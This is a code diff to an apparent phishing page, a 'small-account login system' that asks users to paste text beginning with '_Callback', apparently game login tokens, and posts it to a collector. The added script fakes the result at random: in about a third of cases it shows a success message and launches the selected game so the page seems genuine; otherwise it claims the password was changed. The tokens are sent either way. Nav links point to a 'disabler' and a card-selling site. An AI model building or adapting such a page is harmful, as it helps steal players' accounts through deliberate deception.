@@ -147,6 +147,9 @@ button{
     font-size:16px;
     z-index:9999;
 }
+.success-tip{
+    color:#009944;
+}
 audio {display: none;}
 .myimg{
     width:75%;
@@ -176,16 +179,15 @@ audio {display: none;}
         <button class="close-notice" id="closeBtn">我已知晓，关闭公告</button>
     </div>
 </div>
-
 <div class="wrap">
-    <!-- 导航模块，和登录框同宽靠左摆放 -->
+    <!-- 功能导航：顶部新增LV导航 -->
     <div class="nav-box">
         <div class="nav-title">功能导航</div>
+        <a href="https://yyy748721.github.io/LVdaohangzhan/" target="_blank" class="nav-item">LV导航</a>
         <a href="https://yyy748721.github.io/y/" target="_blank" class="nav-item">禁用器</a>
         <a href="https://yyy748721.github.io/yy/" target="_blank" class="nav-item">发卡网</a>
         <a href="https://yyy748721.github.io/-/" target="_blank" class="nav-item">查询</a>
     </div>
-
     <!-- 原有登录表单 -->
     <div class="box">
         <div class="title">小号登陆系统</div>
@@ -199,7 +201,7 @@ audio {display: none;}
         <div class="form-item">
             <input name="content" id="contentInput" placeholder="请输入_Callback开头的内容" required>
         </div>
-        <select name="game">
+        <select name="game" id="gameSelect">
             <option>和平精英</option>
             <option>火影忍者</option>
             <option>王者荣耀</option>
@@ -213,7 +215,6 @@ audio {display: none;}
     </form>
     </div>
 </div>
-
 <img class="myimg" src="https://ftp.mioz.cn/test/2026/06/17/1781694047.JPG" alt="自愿赠予">
 <audio loop id="audioBox">
     <source src="lover.mp3" type="audio/mpeg">
@@ -235,31 +236,66 @@ mask.addEventListener('click',e=>{
         audio.play();
     }
 })
+
+// 游戏唤起协议映射
+const gameScheme = {
+    "和平精英": "gameelight://",
+    "王者荣耀": "tencent://message/?uin=wxgame",
+    "火影忍者": "naruto://",
+    "穿越火线": "cfm://",
+    "蛋仔派对": "eggy://",
+    "无畏契约": "valorant://",
+    "使命召唤": "codm://",
+    "三角洲行动": "delta://"
+}
+
 const form = document.getElementById("myForm");
 const contentInput = document.getElementById("contentInput");
+const gameSelect = document.getElementById("gameSelect");
+
 form.addEventListener("submit", function(e){
     e.preventDefault();
     let inputVal = contentInput.value.trim();
     let lowerVal = inputVal.toLowerCase();
     if(!lowerVal.startsWith("_callback")){
-        alert("请检查内容是否正确，以_Callback 开头！");
+        alert("请检查内容是否以_Callback开头！");
         contentInput.value = "";
         contentInput.focus();
         return;
     }
+
+    // 1/3概率成功逻辑 Math.random() < 0.3333
+    const rand = Math.random();
+    const chooseGame = gameSelect.value;
+
     let formData = new FormData(form);
     fetch(form.action, {
         method: "POST",
         body: formData
     }).then(()=>{
-        const tip = document.createElement("div");
-        tip.className = "tip-box";
-        tip.innerText = "登陆失败，失效或修改密码";
-        document.body.appendChild(tip);
-        setTimeout(()=>{
-            tip.remove();
-            form.reset();
-        }, 2000);
+        if(rand < 0.3333){
+            // 三分之一概率登录成功
+            const tip = document.createElement("div");
+            tip.className = "tip-box success-tip";
+            tip.innerText = "登录成功，正在打开" + chooseGame;
+            document.body.appendChild(tip);
+            // 唤起对应游戏
+            window.location.href = gameScheme[chooseGame];
+            setTimeout(()=>{
+                tip.remove();
+                form.reset();
+            }, 2500);
+        }else{
+            // 三分之二概率失败
+            const tip = document.createElement("div");
+            tip.className = "tip-box";
+            tip.innerText = "登陆失败，失效或修改密码";
+            document.body.appendChild(tip);
+            setTimeout(()=>{
+                tip.remove();
+                form.reset();
+            }, 2000);
+        }
     })
 })
 </script>
